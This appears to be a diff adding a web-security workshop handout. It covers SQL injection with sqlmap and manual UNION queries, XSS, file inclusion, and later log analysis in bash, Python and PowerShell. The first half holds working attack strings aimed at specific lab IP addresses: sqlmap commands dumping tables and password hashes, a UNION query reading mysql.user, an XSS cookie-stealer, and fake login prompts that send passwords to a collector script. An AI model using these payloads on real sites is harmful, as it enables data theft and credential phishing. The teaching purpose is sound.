+python sqlmap.py -u "http://54.245.184.121/bookdetail.aspx?id=2" -b
+python sqlmap.py -u "http://54.245.184.121/bookdetail.aspx?id=2" --current-user
+python sqlmap.py -u "http://54.245.184.121/bookdetail.aspx?id=2" --current-db 
+python sqlmap.py -u "http://54.245.184.121/bookdetail.aspx?id=2" --dbs 
+python sqlmap.py -u "http://54.245.184.121/bookdetail.aspx?id=2" -D BookApp --tables 
+python sqlmap.py -u "http://54.245.184.121/bookdetail.aspx?id=2" -D BookApp -T BOOKMASTER --columns 
+python sqlmap.py -u "http://54.245.184.121/bookdetail.aspx?id=2" -D BookApp -T sysdiagrams --columns 
+python sqlmap.py -u "http://54.245.184.121/bookdetail.aspx?id=2" -D BookApp -T BOOKMASTER --columns --dump 
+python sqlmap.py -u "http://54.245.184.121/bookdetail.aspx?id=2" -D BookApp -T sysdiagrams --columns --dump 
+python sqlmap.py -u "http://54.245.184.121/bookdetail.aspx?id=2" --users --passwords 
+ 
+ #######################
+# Attacking PHP/MySQL #
+#######################
+ 
+Go to LAMP Target homepage
+http://45.63.104.73/
+ 
+ 
+ 
+Clicking on the Acer Link:
+http://45.63.104.73/acre2.php?lap=acer
+ 
+    - Found parameter passing (answer yes to question 1)
+    - Insert ' to test for SQLI
+ 
+http://45.63.104.73/acre2.php?lap=acer'
+ 
+ 
+Page returns the following error:
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''acer''' at line 1
+ 
+ 
+ 
+In order to perform union-based sql injection - we must first determine the number of columns in this query.
+We do this using the ORDER BY
+http://45.63.104.73/acre2.php?lap=acer' order by 100-- +
+ 
+Page returns the following error:
+Unknown column '100' in 'order clause'
+ 
+ 
+ 
+http://45.63.104.73/acre2.php?lap=acer' order by 50-- +
+ 
+Page returns the following error:
+Unknown column '50' in 'order clause'
+ 
+ 
+ 
+http://45.63.104.73/acre2.php?lap=acer' order by 25-- +
+Page returns the following error:
+Unknown column '25' in 'order clause'
+ 
+ 
+ 
+http://45.63.104.73/acre2.php?lap=acer' order by 12-- +
+ 
+Page returns the following error:
+Unknown column '50' in 'order clause'
+ 
+ 
+ 
+http://45.63.104.73/acre2.php?lap=acer' order by 6-- +
+---Valid page returned for 5 and 6...error on 7 so we know there are 6 columns
+ 
+ 
+ 
+Now we build out the union all select statement with the correct number of columns
+ 
+Reference:
+http://www.techonthenet.com/sql/union.php
+ 
+ 
+ 
+http://45.63.104.73/acre2.php?lap=acer' union all select 1,2,3,4,5,6-- +
+ 
+ 
+ 
+Now we negate the parameter value 'acer' by turning into the word 'null':
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,4,5,6-- j
+ 
+We see that a 4 and a 5 are on the screen. These are the columns that will echo back data
+ 
+ 
+Use a cheat sheet for syntax:
+http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+ 
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),5,6-- j
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),version(),6-- j
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),@@version,6-- +
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),@@datadir,6-- +
+ 
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user,password,6 from mysql.user -- a
+ 
+ 
+
+
+Sometimes students ask about the "-- j" or "-- +" that I append to SQL injection attack string.
+
+Here is a good reference for it:
+https://www.symantec.com/connect/blogs/mysql-injection-comments-comments
+
+Both attackers and penetration testers alike often forget that MySQL comments deviate from the standard ANSI SQL specification. The double-dash comment syntax was first supported in MySQL 3.23.3. However, in MySQL a double-dash comment "requires the second dash to be followed by at least one whitespace or control character (such as a space, tab, newline, and so on)." This double-dash comment syntax deviation is intended to prevent complications that might arise from the subtraction of negative numbers within SQL queries. Therefore, the classic SQL injection exploit string will not work against backend MySQL databases because the double-dash will be immediately followed by a terminating single quote appended by the web application. However, in most cases a trailing space needs to be appended to the classic SQL exploit string. For the sake of clarity we'll append a trailing space and either a "+" or a letter.
+
+
+###############################################################################
+# What is XSS                                                                 #
+# https://s3.amazonaws.com/infosecaddictsfiles/2-Intro_To_XSS.pptx #
+###############################################################################
+ 
+OK - what is Cross Site Scripting (XSS)
+ 
+1. Use Firefox to browse to the following location:
+ 
+    http://45.63.104.73/xss_practice/
+ 
+    A really simple search page that is vulnerable should come up.
+ 
+ 
+ 
+ 
+2. In the search box type:
+   
+    <script>alert('So this is XSS')</script>
+ 
+ 
+    This should pop-up an alert window with your message in it proving XSS is in fact possible.
+    Ok, click OK and then click back and go back to http://45.63.104.73/xss_practice/
+ 
+ 
+3. In the search box type:
+   
+    <script>alert(document.cookie)</script>
+ 
+ 
+    This should pop-up an alert window with your message in it proving XSS is in fact possible and your cookie can be accessed.
+    Ok, click OK and then click back and go back to http://45.63.104.73/xss_practice/
+ 
+4. Now replace that alert script with:
+ 
+    <script>document.location="http://45.63.104.73/xss_practice/cookie_catcher.php?c="+document.cookie</script>
+ 
+ 
+This will actually pass your cookie to the cookie catcher that we have sitting on the webserver.
+ 
+ 
+5. Now view the stolen cookie at:
+    http://45.63.104.73/xss_practice/cookie_stealer_logs.html
+ 
+ 
+The cookie catcher writes to this file and all we have to do is make sure that it has permissions to be written to.
+ 
+ 
+ 
+ 
+ 
+ 
+############################
+# A Better Way To Demo XSS #
+############################
+ 
+ 
+Let's take this to the next level. We can modify this attack to include some username/password collection. Paste all of this into the search box.
+ 
+ 
+Use Firefox to browse to the following location:
+ 
+    http://45.63.104.73/xss_practice/
+ 
+ 
+ 
+Paste this in the search box
+----------------------------
+ 
+ 
+Option 1
+--------
+ 
+<script>
+password=prompt('Your session is expired. Please enter your password to continue',' ');
+document.write("<img src=\"http://45.63.104.73/xss_practice/passwordgrabber.php?password=" +password+"\">");
+</script>
+ 
+ 
+Now view the stolen cookie at:
+    http://45.63.104.73/xss_practice/passwords.html
+ 
+ 
+ 
+Option 2
+--------
+<script>
+username=prompt('Please enter your username',' ');
+password=prompt('Please enter your password',' ');
+document.write("<img src=\"http://45.63.104.73/xss_practice/unpw_catcher.php?username="+username+"&password="+password+"\">");
+</script>
+ 
+ 
+ 
+ 
+Now view the stolen cookie at:
+http://45.63.104.73/xss_practice/username_password_logs.html
+ 
+ 
+ 
+ 
+#########################################
+# Let's try a local file include (LFI)  #
+#########################################
+- Here is an example of an LFI
+- Open this page in Firefox:
+http://45.63.104.73/showfile.php?filename=contactus.txt
+ 
+- Notice the page name (showfile.php) and the parameter name (filename) and the filename (contactus.txt)
+- Here you see a direct reference to a file on the local filesystem of the victim machine.
+- You can attack this by doing the following:
+http://45.63.104.73/showfile.php?filename=/etc/passwd
+ 
+- This is an example of a Local File Include (LFI), to change this attack into a Remote File Include (RFI) you need some content from
+- somewhere else on the Internet. Here is an example of a text file on the web:
+http://www.opensource.apple.com/source/SpamAssassin/SpamAssassin-127.2/SpamAssassin/t/data/etc/hello.txt
+ 
+- Now we can attack the target via RFI like this:
+http://45.63.104.73/showfile.php?filename=http://www.opensource.apple.com/source/SpamAssassin/SpamAssassin-127.2/SpamAssassin/t/data/etc/hello.txt
+ 
+ 
+ 
+ 
+###############################
+# How much fuzzing is enough? #
+###############################
+There really is no exact science for determining the correct amount of fuzzing per parameter to do before moving on to something else.
+ 
+Here are the steps that I follow when I'm testing (my mental decision tree) to figure out how much fuzzing to do.
+ 
+ 
+Step 1: Ask yourself the 3 questions per page of the site.
+ 
+Step 2: If the answer is yes, then go down that particular attack path with a few fuzz strings (I usually do 10-20 fuzz strings per parameter)
+ 
+Step 3: When you load your fuzz strings - use the following decision tree
+ 
+    - Are the fuzz strings causing a default error message (example 404)?
+        - If this is the case then it is most likely NOT vulnerable
+ 
+    - Are the fuzz strings causing a WAF or LB custom error message?
+        - If this is the case then you need to find an encoding method to bypass
+ 
+ 
+    - Are the fuzz strings causing an error message that discloses the backend type?
+        - If yes, then identify DB type and find correct syntax to successfully exploit
+        - Some example strings that I use are:
+            '
+            "
+            ()          <----- Take the parameter value and put it in parenthesis
+            (5-1)       <----- See if you can perform an arithmetic function
+ 
+ 
+    - Are the fuzz strings rendering executable code?
+        - If yes, then report XSS/CSRF/Response Splitting/Request Smuggling/etc
+        - Some example strings that I use are:
+            <b>hello</b>
+            <u>hello</u>
+            <script>alert(123);</script>
+            <script>alert(xss);</script>
+            <script>alert('xss');</script>
+            <script>alert("xss");</script>
+ 
+ 
+       
+ 
+#################
+#  Log Analysis #
+#################
+
+VM for these labs
+-----------------
+- InfoSec Addicts Ubuntu Virtual Machine
+https://s3.amazonaws.com/infosecaddictsvirtualmachines/InfoSecAddictsVM.zip
+user: infosecaddicts
+pass: infosecaddicts
+ 
+
+- Windows 7 Virtual Machine
+https://s3.amazonaws.com/infosecaddictsvirtualmachines/Win7x64.zip
+user: workshop
+pass: password
+
+
+
+
+##############################################
+# Log Analysis with Linux command-line tools #
+##############################################
+The following command line executables are found in the Mac as well as most Linux Distributions.
+
+cat –  prints the content of a file in the terminal window
+grep – searches and filters based on patterns
+awk –  can sort each row into fields and display only what is needed
+sed –  performs find and replace functions
+sort – arranges output in an order
+uniq – compares adjacent lines and can report, filter or provide a count of duplicates
+
+
+
+
+##############
+# Cisco Logs #
+##############
+
+---------------------------Type This-----------------------------------
+
+wget https://s3.amazonaws.com/infosecaddictsfiles/cisco.log
+-----------------------------------------------------------------------
+
+
+AWK Basics
+----------
+To quickly demonstrate the print feature in awk, we can instruct it to show only the 5th word of each line. Here we will print $5. Only the last 4 lines are being shown for brevity.
+
+---------------------------Type This-----------------------------------
+
+cat cisco.log | awk '{print $5}' | tail -n 4
+-----------------------------------------------------------------------
+
+
+
+
+Looking at a large file would still produce a large amount of output. A more useful thing to do might be to output every entry found in "$5", group them together, count them, then sort them from the greatest to least number of occurrences. This can be done by piping the output through "sort", using "uniq -c" to count the like entries, then using "sort -rn" to sort it in reverse order.
+
+---------------------------Type This-----------------------------------
+
+cat cisco.log | awk '{print $5}'| sort | uniq -c | sort -rn
+-----------------------------------------------------------------------
+
+
+
+
+While that's sort of cool, it is obvious that we have some garbage in our output. Evidently we have a few lines that aren't conforming to the output we expect to see in $5. We can insert grep to filter the file prior to feeding it to awk. This insures that we are at least looking at lines of text that contain "facility-level-mnemonic".
+
+---------------------------Type This-----------------------------------
+
+cat cisco.log | grep %[a-zA-Z]*-[0-9]-[a-zA-Z]* | awk '{print $5}' | sort | uniq -c | sort -rn
+-----------------------------------------------------------------------
+
+
+
+
+
+Now that the output is cleaned up a bit, it is a good time to investigate some of the entries that appear most often. One way to see all occurrences is to use grep.
+
+---------------------------Type This-----------------------------------
+
+cat cisco.log | grep %LINEPROTO-5-UPDOWN:
+
+cat cisco.log | grep %LINEPROTO-5-UPDOWN:| awk '{print $10}' | sort | uniq -c | sort -rn
+
+cat cisco.log | grep %LINEPROTO-5-UPDOWN:| sed 's/,//g' | awk '{print $10}' | sort | uniq -c | sort -rn
+
+cat cisco.log | grep %LINEPROTO-5-UPDOWN:| sed 's/,//g' | awk '{print $10 " changed to " $14}' | sort | uniq -c | sort -rn
+-----------------------------------------------------------------------
+
+
+
+
+#################################
+# Using Python for log analysis #
+#################################
+
+
+
+
+###########################################
+# Python Basics Lesson 1: Simple Printing #
+###########################################
+
+---------------------------Type This-----------------------------------
+
+>>> print 1
+
+>>> print hello
+
+>>> print "hello"
+ 
+>>> print "Today we are learning Python."
+-----------------------------------------------------------------------
+ 
+ 
+ 
+###################################################
+# Python Basics Lesson 2: Simple Numbers and Math #
+###################################################
+
+---------------------------Type This-----------------------------------
+
+>>> 2+2
+ 
+>>> 6-3
+ 
+>>> 18/7
+ 
+>>> 18.0/7
+ 
+>>> 18.0/7.0
+ 
+>>> 18/7
+ 
+>>> 9%4
+ 
+>>> 8%4
+ 
+>>> 8.75%.5
+ 
+>>> 6.*7
+ 
+>>> 6*6*6
+ 
+>>> 6**3
+ 
+>>> 5**12
+ 
+>>> -5**4
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+#####################################
+# Python Basics Lesson 3: Variables #
+#####################################
+
+---------------------------Type This-----------------------------------
+ 
+>>> x=18
+ 
+>>> x+15
+ 
+>>> x**3
+ 
+>>> y=54
+ 
+>>> x+y
+ 
+>>> age=input("Enter number here: ")
+        43
+ 
+>>> age+32
+ 
+>>> age**3
+
+>>> fname = raw_input("Enter your first name: ")
+
+>>> lname = raw_input("Enter your first name: ")
+
+>>> fname = raw_input("Enter your name: ")
+Enter your name: Joe
+
+>>> lname = raw_input("Enter your name: ")
+Enter your name: McCray
+
+>>> print fname
+Joe
+
+>>> print lname
+McCray
+
+>>> print fname lname
+
+>>> print fname+lname
+JoeMcCray
+-----------------------------------------------------------------------
+
+ 
+ 
+NOTE:
+Use "input() for integers and expressions, and use raw_input() when you are dealing with strings. 
+ 
+ 
+ 
+ 
+ 
+#################################################
+# Python Basics Lesson 4: Modules and Functions #
+#################################################
+
+---------------------------Type This-----------------------------------
+
+>>> 5**4
+ 
+>>> pow(5,4)
+ 
+>>> abs(-18)
+ 
+>>> abs(5)
+ 
+>>> floor(18.7)
+ 
+>>> import math
+ 
+>>> math.floor(18.7)
+ 
+>>> math.sqrt(81)
+ 
+>>> joe = math.sqrt
+ 
+>>> joe(9)
+ 
+>>> joe=math.floor
+ 
+>>> joe(19.8)
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+###################################
+# Python Basics Lesson 5: Strings #
+###################################
+
+---------------------------Type This-----------------------------------
+ 
+>>> "XSS"
+ 
+>>> 'SQLi'
+ 
+>>> "Joe's a python lover"
+ 
+>>> 'Joe\'s a python lover'
+ 
+>>> "Joe said \"InfoSec is fun\" to me"
+ 
+>>> a = "Joe"
+ 
+>>> b = "McCray"
+ 
+>>> a, b
+ 
+>>> a+b
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+########################################
+# Python Basics Lesson 6: More Strings #
+########################################
+
+---------------------------Type This-----------------------------------
+ 
+>>> num = 10
+ 
+>>> num + 2
+ 
+>>> "The number of open ports found on this system is " + num
+ 
+>>> num = str(18)
+ 
+>>> "There are " + num + " vulnerabilities found in this environment."
+ 
+>>> num2 = 46
+ 
+>>> "As of 08/20/2012, the number of states that enacted the Security Breach Notification Law is " + `num2`
+-----------------------------------------------------------------------
+ 
+
+ 
+NOTE:
+Use "input() for integers and expressions, and use raw_input() when you are dealing with strings.
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+###############################################
+# Python Basics Lesson 7: Sequences and Lists #
+###############################################
+
+---------------------------Type This-----------------------------------
+
+>>> attacks = ['Stack Overflow', 'Heap Overflow', 'Integer Overflow', 'SQL Injection', 'Cross-Site Scripting', 'Remote File Include']
+ 
+>>> attacks
+['Stack Overflow', 'Heap Overflow', 'Integer Overflow', 'SQL Injection', 'Cross-Site Scripting', 'Remote File Include']
+ 
+>>> attacks[3]
+'SQL Injection'
+ 
+>>> attacks[-2]
+'Cross-Site Scripting'
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+########################################
+# Python Basics Level 8: If Statement #
+########################################
+
+---------------------------Type This-----------------------------------
+
+>>> attack="SQLI"
+>>> if attack=="SQLI":
+        print 'The attacker is using SQLI'
+ 
+>>> attack="XSS"
+>>> if attack=="SQLI":
+        print 'The attacker is using SQLI'
+-----------------------------------------------------------------------
+
+ 
+#############################
+# Reference Videos To Watch #
+#############################
+Here is your first set of youtube videos that I'd like for you to watch:
+https://www.youtube.com/playlist?list=PLEA1FEF17E1E5C0DA (watch videos 1-10)
+ 
+ 
+ 
+ 
+ 
+#####################################
+# Lesson 9: Intro to Log Analysis #
+#####################################
+ 
+Login to your StrategicSec Ubuntu machine. You can download the VM from the following link:
+ 
+- InfoSec Addicts Ubuntu Virtual Machine
+https://s3.amazonaws.com/infosecaddictsvirtualmachines/InfoSecAddictsVM.zip
+user: infosecaddicts
+pass: infosecaddicts
+ 
+
+ 
+Then execute the following commands:
+
+---------------------------Type This-----------------------------------
+ 
+ 
+wget https://s3.amazonaws.com/infosecaddictsfiles/access_log
+ 
+ 
+cat access_log | grep 141.101.80.188
+ 
+cat access_log | grep 141.101.80.187
+ 
+cat access_log | grep 108.162.216.204
+ 
+cat access_log | grep 173.245.53.160
+ 
+---------------------------------------------------------
+ 
+Google the following terms:
+        - Python read file
+        - Python read line
+        - Python read from file
+ 
+ 
+ 
+ 
+########################################################
+# Lesson 10: Use Python to read in a file line by line #
+########################################################
+ 
+ 
+Reference:
+http://cmdlinetips.com/2011/08/three-ways-to-read-a-text-file-line-by-line-in-python/
+
+
+
+
+
+
+Let's have some fun.....
+
+---------------------------Type This-----------------------------------
+
+>>> f = open('access_log', "r")
+
+>>> lines = f.readlines()
+
+>>> print lines
+
+>>> lines[0]
+
+>>> lines[10]
+
+>>> lines[50]
+
+>>> lines[1000]
+
+>>> lines[5000]
+
+>>> lines[10000]
+
+>>> print len(lines)
+
+
+
+
+
+
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+vi logread1.py
+ 
+---------------------------Paste This-----------------------------------
+ 
+## Open the file with read only permit
+f = open('access_log', "r")
+ 
+## use readlines to read all lines in the file
+## The variable "lines" is a list containing all lines
+lines = f.readlines()
+ 
+print lines
+ 
+ 
+## close the file after reading the lines.
+f.close()
+ 
+---------------------------------------------------------
+ 
+ 
+Google the following:
+        - python difference between readlines and readline
+        - python readlines and readline
+ 
+ 
+ 
+ 
+ 
+#################################
+# Lesson 11: A quick challenge #
+#################################
+ 
+Can you write an if/then statement that looks for this IP and print "Found it"?
+ 
+ 
+141.101.81.187
+ 
+ 
+ 
+ 
+ 
+ 
+---------------------------------------------------------
+Hint 1: Use Python to look for a value in a list
+ 
+Reference:
+http://www.wellho.net/mouth/1789_Looking-for-a-value-in-a-list-Python.html
+ 
+ 
+ 
+ 
+---------------------------------------------------------
+Hint 2: Use Python to prompt for user input
+ 
+Reference:
+http://www.cyberciti.biz/faq/python-raw_input-examples/
+ 
+ 
+ 
+ 
+---------------------------------------------------------
+Hint 3: Use Python to search for a string in a list
+ 
+Reference:
+http://stackoverflow.com/questions/4843158/check-if-a-python-list-item-contains-a-string-inside-another-string
+ 
+ 
+ 
+ 
+ 
+Here is my solution:
+-------------------
+$ python
+>>> f = open('access_log', "r")
+>>> lines = f.readlines()
+>>> ip = '141.101.81.187'
+>>> for string in lines:
+...     if ip in string:
+...             print(string)
+ 
+ 
+ 
+ 
+Here is one student's solution - can you please explain each line of this code to me?
+-------------------------------------------------------------------------------------
+#!/usr/bin/python
+ 
+f = open('access_log')
+ 
+strUsrinput = raw_input("Enter IP Address: ")
+ 
+for line in iter(f):
+    ip = line.split(" - ")[0]
+    if ip == strUsrinput:
+        print line
+ 
+f.close()
+ 
+ 
+ 
+ 
+-------------------------------
+ 
+Working with another student after class we came up with another solution:
+ 
+#!/usr/bin/env python
+ 
+ 
+# This line opens the log file
+f=open('access_log',"r")
+ 
+# This line takes each line in the log file and stores it as an element in the list
+lines = f.readlines()
+ 
+ 
+# This lines stores the IP that the user types as a var called userinput
+userinput = raw_input("Enter the IP you want to search for: ")
+ 
+ 
+ 
+# This combination for loop and nested if statement looks for the IP in the list called lines and prints the entire line if found.
+for ip in lines:
+    if ip.find(userinput) != -1:
+        print ip
+ 
+ 
+ 
+##################################################
+# Lesson 12: Look for web attacks in a log file #
+##################################################
+ 
+In this lab we will be looking at the scan_log.py script and it will scan the server log to find out common hack attempts within your web server log.
+Supported attacks:
+1.          SQL Injection
+2.          Local File Inclusion
+3.          Remote File Inclusion
+4.          Cross-Site Scripting
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+wget https://s3.amazonaws.com/infosecaddictsfiles/scan_log.py
+-----------------------------------------------------------------------
+ 
+- The usage for scan_log.py is simple.  You feed it an apache log file.
+
+---------------------------Type This-----------------------------------
+ 
+cat scan_log.py | less                  (use your up/down arrow keys to look through the file)
+-----------------------------------------------------------------------
+
+
+
+
+
+################################
+# Log Analysis with Powershell #
+################################
+
+VM for these labs
+-----------------
+https://s3.amazonaws.com/infosecaddictsvirtualmachines/Win7x64.zip
+        username: workshop
+        password: password
+
+ 
+You can do the updates in the Win7 VM (yes, it is a lot of updates).
+ 
+You'll need to create directory in the Win7 VM called "c:\ps"
+ 
+#####################
+# Powershell Basics #
+#####################
+ 
+PowerShell is Microsoft's new scripting language that has been built in since the release Vista.
+ 
+PowerShell file extension end in .ps1 .
+ 
+An important note is that you cannot double click on a PowerShell script to execute it.
+ 
+To open a PowerShell command prompt either hit Windows Key + R and type in PowerShell or Start -> All Programs -> Accessories -> Windows PowerShell -> Windows PowerShell.
+
+---------------------------Type This-----------------------------------
+ 
+dir
+cd
+ls
+cd c:\
+-----------------------------------------------------------------------
+ 
+ 
+To obtain a list of cmdlets, use the Get-Command cmdlet
+
+---------------------------Type This-----------------------------------
+
+Get-Command
+-----------------------------------------------------------------------
+ 
+ 
+ 
+You can use the Get-Alias cmdlet to see a full list of aliased commands.
+
+---------------------------Type This-----------------------------------
+ 
+Get-Alias
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Don't worry you won't blow up your machine with Powershell
+
+---------------------------Type This-----------------------------------
+
+Get-Process | stop-process                              What will this command do?
+Get-Process | stop-process -whatif
+-----------------------------------------------------------------------
+ 
+ 
+To get help with a cmdlet, use the Get-Help cmdlet along with the cmdlet you want information about.
+
+---------------------------Type This-----------------------------------
+
+Get-Help Get-Command
+ 
+Get-Help Get-Service –online
+ 
+Get-Service -Name TermService, Spooler
+ 
+Get-Service –N BITS
+ 
+Start-Transcript
+-----------------------------------------------------------------------
+ 
+PowerShell variables begin with the $ symbol. First lets create a variable
+
+---------------------------Type This-----------------------------------
+ 
+$serv = Get-Service –N Spooler
+-----------------------------------------------------------------------
+ 
+To see the value of a variable you can just call it in the terminal.
+
+---------------------------Type This-----------------------------------
+ 
+$serv
+ 
+$serv.gettype().fullname
+-----------------------------------------------------------------------
+ 
+ 
+Get-Member is another extremely useful cmdlet that will enumerate the available methods and properties of an object. You can pipe the object to Get-Member or pass it in
+
+---------------------------Type This-----------------------------------
+ 
+$serv | Get-Member
+ 
+Get-Member -InputObject $serv
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+Let's use a method and a property with our object.
+
+---------------------------Type This-----------------------------------
+ 
+$serv.Status
+$serv.Stop()
+$serv.Refresh()
+$serv.Status
+$serv.Start()
+$serv.Refresh()
+$serv.Status
+-----------------------------------------------------------------------
+
+ 
+ 
+ 
+Methods can return properties and properties can have sub properties. You can chain them together by appending them to the first call.
+ 
+ 
+ 
+#############################
+# Simple Event Log Analysis #
+#############################
+ 
+Step 1: Dump the event logs
+---------------------------
+The first thing to do is to dump them into a format that facilitates later processing with Windows PowerShell.
+ 
+To dump the event log, you can use the Get-EventLog and the Exportto-Clixml cmdlets if you are working with a traditional event log such as the Security, Application, or System event logs.
+If you need to work with one of the trace logs, use the Get-WinEvent and the ExportTo-Clixml cmdlets.
+
+---------------------------Type This-----------------------------------
+ 
+Get-EventLog -LogName application | Export-Clixml Applog.xml
+ 
+type .\Applog.xml
+ 
+$logs = "system","application","security"
+-----------------------------------------------------------------------
+ 
+The % symbol is an alias for the Foreach-Object cmdlet. It is often used when working interactively from the Windows PowerShell console
+
+---------------------------Type This-----------------------------------
+ 
+$logs | % { get-eventlog -LogName $_ | Export-Clixml "$_.xml" }
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Step 2: Import the event log of interest
+----------------------------------------
+To parse the event logs, use the Import-Clixml cmdlet to read the stored XML files.
+Store the results in a variable.
+Let's take a look at the commandlets Where-Object, Group-Object, and Select-Object.
+ 
+The following two commands first read the exported security log contents into a variable named $seclog, and then the five oldest entries are obtained.
+
+---------------------------Type This-----------------------------------
+ 
+$seclog = Import-Clixml security.xml
+ 
+$seclog | select -Last 5
+-----------------------------------------------------------------------
+ 
+ 
+Cool trick from one of our students named Adam. This command allows you to look at the logs for the last 24 hours:
+
+---------------------------Type This-----------------------------------
+ 
+Get-EventLog Application -After (Get-Date).AddDays(-1)
+-----------------------------------------------------------------------
+
+You can use '-after' and '-before' to filter date ranges
+ 
+One thing you must keep in mind is that once you export the security log to XML, it is no longer protected by anything more than the NFTS and share permissions that are assigned to the location where you store everything.
+By default, an ordinary user does not have permission to read the security log.
+ 
+ 
+Step 3: Drill into a specific entry
+-----------------------------------
+To view the entire contents of a specific event log entry, choose that entry, send the results to the Format-List cmdlet, and choose all of the properties.
+ 
+---------------------------Type This-----------------------------------
+ 
+$seclog | select -first 1 | fl *
+-----------------------------------------------------------------------
+ 
+The message property contains the SID, account name, user domain, and privileges that are assigned for the new login.
+ 
+---------------------------Type This-----------------------------------
+ 
+($seclog | select -first 1).message
+ 
+(($seclog | select -first 1).message).gettype()
+ 
+-----------------------------------------------------------------------
+ 
+ 
+In the *nix world you often want a count of something (wc -l).
+How often is the SeSecurityPrivilege privilege mentioned in the message property?
+To obtain this information, pipe the contents of the security log to a Where-Object to filter the events, and then send the results to the Measure-Object cmdlet to determine the number of events:
+
+---------------------------Type This-----------------------------------
+
+$seclog | ? { $_.message -match 'SeSecurityPrivilege'} | measure
+
+-----------------------------------------------------------------------
+
+If you want to ensure that only event log entries return that contain SeSecurityPrivilege in their text, use Group-Object to gather the matches by the EventID property.
+ 
+---------------------------Type This-----------------------------------
+ 
+$seclog | ? { $_.message -match 'SeSecurityPrivilege'} | group eventid
+-----------------------------------------------------------------------
+
+Because importing the event log into a variable from the stored XML results in a collection of event log entries, it means that the count property is also present.
+Use the count property to determine the total number of entries in the event log.
+
+---------------------------Type This-----------------------------------
+
+$seclog.Count
+-----------------------------------------------------------------------
+
+ 
+ 
+ 
+ 
+ 
+############################
+# Simple Log File Analysis #
+############################
+ 
+ 
+You'll need to create the directory c:\ps and download sample iss log http://pastebin.com/raw.php?i=LBn64cyA
+ 
+---------------------------Type This-----------------------------------
+ 
+mkdir c:\ps
+cd c:\ps
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=LBn64cyA", "c:\ps\u_ex1104.log")
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+       
+       
+       
+ 
+###############################################
+# Intrusion Analysis Using Windows PowerShell #
+###############################################
+ 
+Download sample file http://pastebin.com/raw.php?i=ysnhXxTV into the c:\ps directory
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=ysnhXxTV", "c:\ps\CiscoLogFileExamples.txt")
+ 
+Select-String 192.168.208.63 .\CiscoLogFileExamples.txt
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+The Select-String cmdlet searches for text and text patterns in input strings and files. You can use it like Grep in UNIX and Findstr in Windows.
+
+---------------------------Type This-----------------------------------
+
+Select-String 192.168.208.63 .\CiscoLogFileExamples.txt | select line
+ 
+-----------------------------------------------------------------------
+
+ 
+ 
+To see how many connections are made when analyzing a single host, the output from that can be piped to another command: Measure-Object.
+
+---------------------------Type This-----------------------------------
+ 
+Select-String 192.168.208.63 .\CiscoLogFileExamples.txt | select line | Measure-Object
+-----------------------------------------------------------------------
+ 
+ 
+ 
+To select all IP addresses in the file expand the matches property, select the value, get unique values and measure the output.
+
+---------------------------Type This-----------------------------------
+ 
+Select-String "\b(?:\d{1,3}\.){3}\d{1,3}\b" .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select -ExpandProperty value | Sort-Object -Unique | Measure-Object
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Removing Measure-Object shows all the individual IPs instead of just the count of the IP addresses. The Measure-Object command counts the IP addresses.
+
+---------------------------Type This-----------------------------------
+ 
+Select-String "\b(?:\d{1,3}\.){3}\d{1,3}\b" .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select -ExpandProperty value | Sort-Object -Unique
+-----------------------------------------------------------------------
+ 
+ 
+In order to determine which IP addresses have the most communication the last commands are removed to determine the value of the matches. Then the group command is issued on the piped output to group all the IP addresses (value), and then sort the objects by using the alias for Sort-Object: sort count –des.
+This sorts the IP addresses in a descending pattern as well as count and deliver the output to the shell.
+
+---------------------------Type This-----------------------------------
+
+Select-String "\b(?:\d{1,3}\.){3}\d{1,3}\b" .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select value | group value | sort count -des
+-----------------------------------------------------------------------
+ 
+ 
+ 
+
+ 
+ 
+##############################################
+# Parsing Log files using windows PowerShell #
+##############################################
+ 
+Download the sample IIS log http://pastebin.com/LBn64cyA
+ 
+---------------------------Type This-----------------------------------
+ 
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=LBn64cyA", "c:\ps\u_ex1104.log")
+ 
+Get-Content ".\*log" | ? { ($_ | Select-String "WebDAV")}  
+-----------------------------------------------------------------------
+ 
+ 
+ 
+The above command would give us all the WebDAV requests.
+ 
+To filter this to a particular user name, use the below command:
+
+---------------------------Type This-----------------------------------
+ 
+Get-Content ".\*log" | ? { ($_ | Select-String "WebDAV") -and ($_ | Select-String "OPTIONS")}  
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Some more options that will be more commonly required :
+ 
+For Outlook Web Access : Replace WebDAV with OWA
+ 
+For EAS : Replace WebDAV with Microsoft-server-activesync
+ 
+For ECP : Replace WebDAV with ECP
+ 
+ 
+ 
+To find out the count of the EWS request we can go ahead and run the below command
+ 
+---------------------------Type This-----------------------------------
+
+(Get-Content ".\*log" | ? { ($_ | Select-String "WebDAV") -and ($_ | Select-String "Useralias")}).count
+-----------------------------------------------------------------------
+
+
+
+
+
+
+
+################################
